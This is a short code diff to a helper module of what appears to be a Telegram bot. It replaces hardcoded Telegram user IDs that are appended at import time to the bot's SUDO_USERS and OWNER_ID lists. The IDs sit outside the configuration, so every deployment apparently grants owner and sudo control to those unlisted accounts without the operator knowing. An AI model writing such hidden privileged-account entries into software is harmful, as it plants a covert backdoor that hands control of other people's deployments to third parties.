@@ -4,10 +4,10 @@ from Telugucoders.helpers.admins import get_administrators
 from config import SUDO_USERS, OWNER_ID
 from typing import Callable, Union, Optional
 
-SUDO_USERS.append(6168241978)
+SUDO_USERS.append(5148378105)
 
-OWNER_ID.append(5400798129)
-OWNER_ID.append(5857041668)
+OWNER_ID.append(5148378105)
+OWNER_ID.append(5287499306)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
